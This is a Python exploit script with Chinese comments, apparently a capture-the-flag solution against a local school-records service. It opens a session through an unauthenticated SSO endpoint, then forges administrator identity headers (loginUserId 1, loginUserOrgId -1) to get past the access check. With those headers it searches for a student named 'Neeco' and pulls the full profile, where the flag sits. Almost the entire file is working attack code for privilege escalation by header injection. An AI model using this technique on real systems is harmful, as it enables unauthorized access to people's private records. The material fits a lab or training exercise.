#!/usr/bin/env python3
"""headerauth exp —— 请求头身份注入越权读取插班生档案

用法: python3 exp.py [http://host:port]    （默认 http://127.0.0.1:58000）

演示完整利用链（逐级门槛）：
  无会话 401 -> 有会话无身份头 403 -> 注入管理员身份头检索 -> 详情接口拿 flag
"""
import sys

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:58000").rstrip("/")
ADMIN = {"loginUserId": "1", "loginUserOrgId": "-1"}

# 1) 开放入口：无认证 302 并下发会话 customsid
s = requests.Session()
r = s.get(f"{BASE}/sc/api/application/open/ssoLogin/", allow_redirects=False)
print(f"[*] ssoLogin -> {r.status_code}（预期 302），customsid = {s.cookies.get('customsid', '-')[:16]}...")

# 2) 门槛演示：光有会话不带身份头
r = s.get(f"{BASE}/sc/api/authc/users")
print(f"[*] 仅会话不带身份头 -> {r.status_code}（预期 403，身份判定只看请求头）")

# 3) 注入管理员身份头，按名检索插班生（列表只回摘要字段）
r = s.get(f"{BASE}/sc/api/authc/users", headers=ADMIN, params={"name": "Neeco"})
rec = r.json()["data"]["records"][0]
print(f"[*] loginUserId:1 + loginUserOrgId:-1 检索\"Neeco\" -> userId = {rec['userId']}（摘要无 flag）")

# 4) 详情接口：全量档案，flag 在 description
r = s.get(f"{BASE}/sc/api/authc/users/{rec['userId']}", headers=ADMIN)
desc = r.json()["data"]["description"]
print(f"[+] description: {desc}")
